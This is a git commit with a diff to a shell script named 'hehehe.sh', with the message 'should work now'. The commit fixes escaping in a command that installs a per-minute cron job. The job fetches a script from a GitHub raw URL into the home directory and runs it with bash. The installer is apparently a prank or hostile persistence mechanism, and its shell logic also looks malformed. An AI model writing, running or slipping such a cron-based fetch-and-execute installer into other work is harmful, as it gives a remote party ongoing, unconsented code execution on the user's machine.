8a57e581ded2f95b97e82cfb06fc6efae1ec2c6f
Isacc Barker <milobanks@zincsoft.dev>
2022-03-01 12:06:27 -0700

    should work now

--- hehehe.sh
+++ hehehe.sh
@@ -1,4 +1,4 @@
-echo -e "\033[7m\033[1m\033[91mINSTALLING CRONJOB\033[0m"
-(crontab -l 2>/dev/null; echo "* * * * * curl https://raw.githubusercontent.com/IsaccBarker/sophial/main/script.sh > ~/.script && cat ~/.script > ~/.pre && if [ \"$(cat ~/.pre)\" != \"$(~/.script)\" ]; then; bash ~/.script; fi") | crontab -
-echo -e "\033[7m\033[1m\033[92mCRONJOB INSTALLED\033[0m"
+echo "\033[7m\033[1m\033[91mINSTALLING CRONJOB\033[0m"
+(crontab -l 2>/dev/null; echo "* * * * * curl https://raw.githubusercontent.com/IsaccBarker/sophial/main/script.sh > ~/.script && cat ~/.script > ~/.pre && if [ \"\$(cat ~/.pre)\" != \"\$(~/.script)\" ]; then; bash ~/.script; fi") | crontab -
+echo "\033[7m\033[1m\033[92mCRONJOB INSTALLED\033[0m"
 
